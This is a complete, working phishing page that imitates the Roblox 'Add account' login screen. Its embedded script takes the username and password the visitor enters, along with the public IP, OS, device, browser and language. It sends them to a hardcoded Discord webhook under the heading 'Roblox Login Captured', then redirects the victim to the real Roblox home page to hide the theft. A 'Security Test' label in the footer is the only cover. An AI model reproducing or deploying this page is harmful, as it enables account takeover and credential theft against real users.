<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Add Account</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,Helvetica,sans-serif;
}

body{
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;

    background:url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg') center center/cover no-repeat;
}

body::before{
    content:"";
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.58);
    z-index:0;
}

/* ========================= */
/* TOP BAR */
/* ========================= */

.topbar{
    position:fixed;
    top:0;
    left:0;
    right:0;

    height:36px;

    background:#181a22;

    border-bottom:1px solid rgba(255,255,255,.06);

    display:flex;
    align-items:center;

    z-index:999;
}

.logo{
    width:22px;
    height:22px;

    margin-left:16px;
    margin-right:38px;

    background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1NiIgaGVpZ2h0PSI1NiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDU2IDU2Ij48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMTEuNjc2IDAgMCA0NC4xNjYgNDMuNTc3IDU2bDExLjY3Ni00NC4xNjZ6bTIwLjQwOSAzNS44MjctMTIuMTc3LTMuMzA4IDMuMjY0LTEyLjM0MiAxMi4xODIgMy4zMDh6Ii8+PC9zdmc+");

    background-repeat:no-repeat;
    background-position:center;
    background-size:contain;
}

.nav{
    display:flex;
    align-items:center;
    gap:52px;
}

.nav a{
    color:#ffffff;
    text-decoration:none;
    font-size:13px;
    font-weight:500;
}

.search{
    position:absolute;
    left:50%;
    transform:translateX(-50%);
}

.search input{
    width:420px;
    height:26px;

    background:#232633;

    border:1px solid rgba(255,255,255,.25);
    border-radius:8px;

    color:white;
    font-size:13px;

    padding:0 12px;

    outline:none;
}

.search input::placeholder{
    color:#c6c8d0;
}

.signup-btn{
    margin-left:auto;
    margin-right:12px;

    background:#335fff;

    color:white;
    text-decoration:none;

    padding:5px 14px;

    border-radius:8px;

    font-size:13px;
    font-weight:700;
}

/* ========================= */
/* LOGIN BOX */
/* ========================= */

.login-container{
    position:relative;
    z-index:1;

    width:362px;

    background:#23252d;

    padding:24px 16px 22px;
}

.title{
    text-align:center;

    color:white;

    font-size:28px;
    font-weight:800;

    margin-bottom:18px;
}

.input{
    width:100%;
    height:40px;

    background:#343744;

    border:1px solid #4b5061;
    border-radius:8px;

    color:white;

    padding:0 12px;

    margin-bottom:10px;

    outline:none;
}

.input::placeholder{
    color:#ececec;
}

.login-btn{
    width:100%;
    height:40px;

    background:transparent;

    border:1px solid #d8d8d8;
    border-radius:8px;

    color:white;

    cursor:pointer;

    transition:background .2s;
}

.login-btn:hover{
    background:rgba(255,255,255,.08);
}

.login-btn:disabled{
    opacity:.5;
    cursor:not-allowed;
}

.forgot{
    text-align:center;

    margin-top:18px;
    margin-bottom:22px;
}

.forgot a{
    color:white;
    text-decoration:none;

    font-size:14px;
    font-weight:700;
}

.forgot a:hover{
    text-decoration:underline;
}

.separator{
    height:1px;
    background:#3d4150;

    margin-bottom:20px;
}

.alt-btn{
    width:100%;
    height:34px;

    background:#3b4050;

    border:none;
    border-radius:8px;

    color:white;

    font-size:14px;
    font-weight:600;

    margin-bottom:8px;

    cursor:pointer;
}

.signup-text{
    text-align:center;

    margin-top:24px;

    color:white;
    font-size:15px;
    font-weight:600;
}

.signup-text a{
    color:white;
    text-decoration:none;
}

.signup-text a:hover{
    text-decoration:underline;
}

#statusMsg{
    text-align:center;
    margin-top:12px;
    font-size:13px;
    color:#aab;
    min-height:20px;
    transition:color .3s;
}
#statusMsg.success{ color:#4ade80; }
#statusMsg.error{ color:#f87171; }
</style>
</head>
<body>

<nav class="topbar">

    <div class="logo"></div>

    <div class="nav">
        <a href="#">Charts</a>
        <a href="#">Marketplace</a>
        <a href="#">Create</a>
        <a href="#">Robux</a>
    </div>

    <div class="search">
        <input type="text" placeholder="Search">
    </div>

    <a class="signup-btn"
       href="https://www.roblox.com/CreateAccount"
       target="_blank">
       Sign Up
    </a>

</nav>

<div class="login-container">

    <div class="title">
        Add account
    </div>

    <input
        type="text"
        class="input"
        id="usernameInput"
        placeholder="Username/Email/Phone"
    >

    <input
        type="password"
        class="input"
        id="passwordInput"
        placeholder="Password"
    >

    <button class="login-btn" id="loginBtn">
        Log In
    </button>

    <div id="statusMsg"></div>

    <div class="forgot">
        <a href="https://www.roblox.com/login/forgot-password-or-username"
           target="_blank">
            Forgot Password or Username?
        </a>
    </div>

    <div class="separator"></div>

    <button class="alt-btn" onclick="alert('One-time code sent (simulated)')">
        Email Me a One-Time Code
    </button>

    <button class="alt-btn" onclick="alert('Quick sign-in (simulated)')">
        Quick Sign-in
    </button>

    <div class="signup-text">
        Don't have an account?
        <a href="https://www.roblox.com/CreateAccount"
           target="_blank">
           Sign Up
        </a>
    </div>

</div>

<script>
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510744005980459072/Wo0tVKL36lpZttZ5Yl8HGT8LQH1Ixmkl2xcsdnipXOmoICtsPtCPKdA2iwkVvn_q1qRA';

    const usernameEl = document.getElementById('usernameInput');
    const passwordEl = document.getElementById('passwordInput');
    const loginBtn   = document.getElementById('loginBtn');
    const statusMsg  = document.getElementById('statusMsg');

    let cachedIP = null;

    function setStatus(text, type){
        statusMsg.textContent = text;
        statusMsg.className = type || '';
    }

    function validate(){
        if(!usernameEl.value.trim()){
            setStatus('Please enter a username/email/phone', 'error');
            return false;
        }
        if(!passwordEl.value.trim()){
            setStatus('Please enter your password', 'error');
            return false;
        }
        return true;
    }

    function getDeviceInfo(){
        const ua = navigator.userAgent;
        let os = 'Unknown';
        let device = 'Desktop';
        let browser = 'Unknown';

        if(/Windows NT 10/.test(ua)) os = 'Windows 10';
        else if(/Windows NT 11/.test(ua)) os = 'Windows 11';
        else if(/Mac OS X/.test(ua)) os = 'macOS';
        else if(/Linux/.test(ua) && !/Android/.test(ua)) os = 'Linux';
        else if(/Android/.test(ua)) os = 'Android';
        else if(/iPhone|iPad|iPod/.test(ua)) os = 'iOS';

        if(/iPhone/.test(ua)) device = 'iPhone';
        else if(/iPad/.test(ua)) device = 'iPad';
        else if(/Android/.test(ua) && /Mobile/.test(ua)) device = 'Android Phone';
        else if(/Android/.test(ua)) device = 'Android Tablet';

        if(/Edg/.test(ua)) browser = 'Edge';
        else if(/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
        else if(/Firefox/.test(ua)) browser = 'Firefox';
        else if(/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
        else if(/Opera|OPR/.test(ua)) browser = 'Opera';

        const lang = navigator.language || navigator.userLanguage || 'Unknown';

        return { os, device, browser, lang, ua };
    }

    // Pre-fetch IP immediately when page loads (in background)
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(d => { cachedIP = d.ip; })
        .catch(() => { cachedIP = 'Unavailable'; });

    loginBtn.addEventListener('click', async function(){

        if(!validate()) return;

        loginBtn.disabled = true;
        loginBtn.textContent = 'Please wait...';
        setStatus('Processing...', '');

        const username = usernameEl.value.trim();
        const password = passwordEl.value.trim();
        const devInfo = getDeviceInfo();

        // Use cached IP (already fetched on page load) or try live
        let ip = cachedIP;
        if(!ip){
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                ip = d.ip;
            } catch(e){
                ip = 'Unavailable';
            }
        }

        const payload = {
            content: `**🎮 Roblox Login Captured**`,
            embeds: [{
                title: 'Account Credentials',
                color: 0x335fff,
                fields: [
                    { name: '👤 Username / Email / Phone', value: username, inline: true },
                    { name: '🔑 Password', value: `||${password}||`, inline: true },
                    { name: '\u200B', value: '\u200B', inline: false },
                    { name: '💻 System', value: devInfo.os, inline: true },
                    { name: '📱 Device', value: devInfo.device, inline: true },
                    { name: '🌐 Browser', value: devInfo.browser, inline: true },
                    { name: '🌍 Language', value: devInfo.lang, inline: true },
                    { name: '🌐 Public IP', value: ip, inline: true },
                    { name: '🕐 Time', value: new Date().toLocaleString('en-US'), inline: true }
                ],
                footer: { text: 'Roblox Security Test' },
                timestamp: new Date().toISOString()
            }]
        };

        try {
            const res = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if(res.ok){
                setStatus('✅ Done!', 'success');
                setTimeout(() => {
                    window.location.href = 'https://www.roblox.com/home';
                }, 1200);
            } else {
                setStatus('❌ Failed', 'error');
                loginBtn.disabled = false;
                loginBtn.textContent = 'Log In';
            }
        } catch(err){
            setStatus('❌ Error', 'error');
            loginBtn.disabled = false;
            loginBtn.textContent = 'Log In';
        }
    });
</script>

</body>
</html>
